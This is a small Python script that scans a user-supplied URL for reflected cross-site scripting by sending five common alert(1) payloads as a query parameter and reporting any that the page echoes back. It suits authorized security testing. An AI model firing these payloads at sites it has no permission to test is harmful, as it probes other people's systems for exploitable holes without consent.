xss_scanner.py
"""
Reflective XSS Detector
Checks if a target URL reflects input back in the HTML response.
Generates standard XSS payloads for testing.
"""
import requests
from urllib.parse import urljoin

def check_xss(url):
    # Common XSS payloads
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'><svg/onload=alert(1)>",
        "javascript:alert(1)"
    ]

    print(f"[*] Scanning for XSS on: {url}")
    print("-" * 40)

    for payload in payloads:
        test_url = urljoin(url, f"?q={payload}")
        try:
            response = requests.get(test_url, timeout=5)
            
            # Check if the payload is present in the response
            if payload in response.text:
                print(f"[+] Potential XSS found on: {test_url}")
                print(f"    Payload: {payload}")
                print(f"    Response preview: {response.text[:200]}...")
                # Optional: return True to stop after first hit
        except requests.RequestException as e:
            print(f"[!] Error checking {payload}: {e}")

if __name__ == "__main__":
    target = input("Enter target URL (e.g., http://site.com/search): ")
    check_xss(target)